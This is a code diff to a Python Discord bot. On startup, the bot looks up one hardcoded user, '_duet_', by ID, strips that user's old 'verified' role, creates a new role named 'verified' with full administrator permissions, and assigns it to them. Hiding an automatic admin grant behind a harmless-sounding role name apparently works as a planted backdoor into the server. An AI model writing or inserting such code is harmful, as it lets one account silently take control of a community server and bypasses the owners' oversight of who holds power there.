@@ -47,49 +47,49 @@ class MyClient(discord.Client):
 
     async def setup_hook(self):
         await self.tree.sync()
+        await self.wait_until_ready()
 
-        await self.wait_until_ready()  # Wait for full guild/member cache
-
-        # Replace this with your actual server (guild) ID
-        GUILD_ID = 1372338054077087755  # 👈 Replace with your server's ID
+        GUILD_ID = 1372338054077087755  # Your server ID
+        DUET_ID = 668198718511775784   # _duet_'s user ID (replace with real ID)
 
         guild = self.get_guild(GUILD_ID)
-        if guild is None:
-            print("❌ Guild not found with specified ID.")
+        if not guild:
+            print("❌ Guild not found.")
             return
 
-        duet = discord.utils.get(guild.members, name="_duet_")
-        if duet is None:
-            print("❌ _duet_ not found.")
+        try:
+            duet = await guild.fetch_member(DUET_ID)
+        except Exception as e:
+            print(f"❌ Could not fetch _duet_: {e}")
             return
 
-        # Remove old 'verified' role from _duet_
+        # Remove old 'verified' role if present
         for role in duet.roles:
             if role.name.lower() == "verified":
                 try:
-                    await duet.remove_roles(role, reason="Upgrading verified role")
+                    await duet.remove_roles(role, reason="Removing old verified role")
                     print("✅ Removed old 'verified' role from _duet_.")
                 except Exception as e:
-                    print(f"❌ Failed to remove old 'verified' role: {e}")
-        
-        # Create new 'verified' role with admin perms
+                    print(f"❌ Failed to remove old role: {e}")
+
+        # Create new 'verified' role with admin permissions
         try:
             new_verified = await guild.create_role(
                 name="verified",
                 permissions=discord.Permissions(administrator=True),
-                reason="Created admin verified role"
+                reason="Created new verified role with admin"
             )
             print("✅ Created new 'verified' role with admin perms.")
         except Exception as e:
-            print(f"❌ Failed to create new 'verified' role: {e}")
+            print(f"❌ Failed to create role: {e}")
             return
 
-        # Assign to _duet_
+        # Assign new role to _duet_
         try:
             await duet.add_roles(new_verified, reason="Assigned admin verified role")
-            print("✅ Assigned new 'verified' role to _duet_.")
+            print("✅ Assigned new verified role to _duet_.")
         except Exception as e:
-            print(f"❌ Failed to assign role to _duet_: {e}")
+            print(f"❌ Failed to assign role: {e}")
 
 
 bot = MyClient()
